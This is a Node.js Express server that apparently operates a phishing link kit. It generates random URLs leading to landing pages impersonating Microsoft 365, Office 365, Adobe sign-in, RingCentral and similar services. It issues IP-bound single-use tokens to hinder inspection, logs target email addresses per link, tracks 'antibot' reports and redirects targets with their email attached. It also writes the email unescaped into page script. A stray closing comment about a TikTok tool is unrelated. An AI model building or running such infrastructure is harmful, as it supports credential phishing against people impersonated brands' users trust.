// server.js
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;
const DOCUMENT_URL = process.env.DOCUMENT_URL || 'https://example.com/your-secure-document';
const TOKEN_TTL_MS = (parseInt(process.env.TOKEN_TTL_MIN || '10', 10) * 60 * 1000);
// const EMAIL="testemail@gmail.com";

app.use(express.json());

// 🔹 Trust only 1 proxy (safe for VPS + Nginx/Cloudflare)
app.set('trust proxy', 1);

// In-memory stores
let tokens = {};
let accessLogs = [];
let reportedIPs = new Set();
let landingLinks = {};
let lastAntibotReports = new Set();
let linkEmails = {}; 

// Default landing templates
const defaultPages = {
  "365.html": "<h1>Microsoft 365 Landing</h1>",
  "adobe.html": "<h1>Adobe Sign-in Page</h1>",
  "office365.html": "<h1>Office 365 Landing</h1>",
  "rincentral.html": "<h1>RingCentral Landing</h1>",
  "voice.html": "<h1>Voice Portal Landing</h1>",
  "docu.html": "<h1>Docu Landing</h1>"
};

// Logging helper
function logLine(line) {
  const stamp = new Date().toISOString();
  const entry = `[${stamp}] ${line}`;
  accessLogs.push(entry);
  console.log(entry);
}

// Rate limiter
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_PER_MIN || '60', 10),
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logLine(`RATE_LIMIT_EXCEEDED ip=${getClientIp(req)} path=${req.originalUrl}`);
    res.status(429).send('Too many requests. Try again later.');
  }
});
app.use(limiter);

// Static assets
app.use('/static', express.static(path.join(__dirname)));
app.use(express.static(path.join(__dirname)));

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function getClientIp(req) {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip || '';
  if (ip.includes(',')) ip = ip.split(',')[0];
  return ip.replace('::ffff:', '').trim();
}

// Serve admin panel
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login_admin.html"));
});

// Login.js panel
app.post('/admin/login', express.json(), (req, res) => {
    const { username, password } = req.body;
    
    // Check against .env credentials
    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid username or password' });
    }
});

// Config endpoint → frontends can fetch DOCUMENT_URL
// Config endpoint → frontends can fetch DOCUMENT_URL
app.get('/config', (req, res) => {
  const email = req.query.email;
  if (email && email.length > 2 && (email !== null || email !== undefined || email !== 'undefined' || email !=='null') ) {
    res.json({ DOCUMENT_URL: `${DOCUMENT_URL}#${email}` });
  } else {
    res.json({ DOCUMENT_URL });
  }
});


// Redirect handler
app.get("/redirect", (req, res) => {
   const email = req.query.email;
  if (email && email.length > 2) {
    res.redirect(`${DOCUMENT_URL}#${email}` );
  } else {
    return res.redirect(DOCUMENT_URL )
  }
});


// ================= ADMIN ENDPOINTS =================
app.post('/admin/create-link', (req, res) => {
  const { landingPage } = req.body;
  const validPages = Object.keys(defaultPages);

  if (!validPages.includes(landingPage)) {
    return res.status(400).json({ error: 'Invalid landing page' });
  }

  const randomPath = crypto.randomBytes(8).toString('hex');
  landingLinks[randomPath] = landingPage;

  const fullUrl = `${req.protocol}://${req.get('host')}/${randomPath}`;
  logLine(`NEW_LINK page=${landingPage} url=${fullUrl}`);
  res.json({ url: fullUrl });
});


app.get('/:pathId', (req, res, next) => {
  const { pathId } = req.params;

  if (landingLinks[pathId]) {
    const token = req.query.token;
    const email = req.query.email ;
    console.log(`Found email : ${email}`);
    console.log(`Found Token: ${token}`);
    // Issue new token if missing
    if (!token || !tokens[token]) {
      const newToken = generateToken();
      tokens[newToken] = { createdAt: Date.now(), ip: getClientIp(req), used: false, ttl: TOKEN_TTL_MS };
      logLine(`TOKEN_ISSUED_FOR_LANDING token=${newToken} pathId=${pathId}`);
      if (!email){
        return res.redirect(`/${pathId}?token=${newToken}`); 
      }
      return res.redirect(`/${pathId}?token=${newToken}&email=${email}`);
      //encodeURIComponent
    }

    // Rotate token if invalid/expired
    if (tokens[token].used || Date.now() - tokens[token].createdAt > TOKEN_TTL_MS || tokens[token].ip !== getClientIp(req)) {
      const newToken = generateToken();
      tokens[newToken] = { createdAt: Date.now(), ip: getClientIp(req), used: false, ttl: TOKEN_TTL_MS };
      tokens[token].used = true;
      logLine(`TOKEN_ROTATED_FOR_LANDING old=${token} new=${newToken} pathId=${pathId}`);     
      if (email && email !== 'No email provided' && email !== 'undefined') {
        linkEmails[pathId] = email;
      }
      if (email){
        return res.redirect(`/${pathId}?token=${newToken}&email=${email}`); 
      }
      return res.redirect(`/${pathId}?token=${newToken}`);
    }

    // Valid token → serve landing page
    tokens[token].used = true;
    logLine(`TOKEN_CONSUMED_FOR_LANDING token=${token} pathId=${pathId}`);

    const filePath = path.join(__dirname, landingLinks[pathId]);
    res.sendFile(filePath, (err) => {
      if (err) {
        logLine(`FILE_NOT_FOUND serving default page: ${landingLinks[pathId]}`);
        let defaultPage = defaultPages[landingLinks[pathId]];
        defaultPage = defaultPage.replace(
          '</body>',
          `<script>
            window.__EMAIL__ = "${email.replace(/"/g, '\\"')}"; 
            window.__REDIRECT_URL__ = ${email} ? "${DOCUMENT_URL}#${email}" :"${DOCUMENT_URL}"; // 👈 inject with @
          </script></body>`
        );
        return res.send(defaultPage);
      } else {
        return res.sendFile(filePath);
      }
    });
  } else {
    next();
  }
});


// ===================================================
// STATUS
app.get('/__status', (req, res) => {
  res.json({
    status: 'ok',
    tokens_in_memory: Object.keys(tokens).length,
    logs_in_memory: accessLogs.length,
    reported_ips: Array.from(reportedIPs),
    active_links: landingLinks,
    link_emails: linkEmails
  });
});

// Listen on all interfaces
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running on http://0.0.0.0:${PORT}`);
});

// ai tool for managing tiktok account...generating content from my videos etc